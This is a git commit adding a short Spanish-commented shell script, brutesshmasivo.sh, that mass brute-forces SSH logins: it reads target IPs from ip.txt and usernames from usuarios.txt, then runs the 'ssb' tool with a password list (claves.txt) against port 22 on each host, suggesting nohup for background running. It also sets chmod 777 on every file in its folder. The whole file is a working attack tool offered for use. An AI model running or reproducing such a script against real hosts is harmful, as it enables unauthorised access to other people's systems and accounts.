042939d189045d9ec7e8d3da40fa471b602106a5
hackingyseguridad <antonio_taboada@hotmail.es>
2022-07-01 11:25:42 +0200

    Create brutesshmasivo.sh

---
+++ brutesshmasivo.sh
@@ -0,0 +1,12 @@
+#!/bin/sh
+echo
+echo "##################################################################"
+echo "ssh masivo a IPs en fichero ip.txt"
+chmod 777 *
+echo "Para mantener como proceso ejecutar: nohup ./brutesshmasivo.sh &"
+echo "Uso.: ./brutesshmasivo.sh "
+echo "##################################################################"
+for i in `cat ip.txt`; do echo $i "<=== IP ";
+for u in `cat usuarios.txt` ; do ssb -p 22 -w claves.txt -c 999 $u@$i;
+done
+done
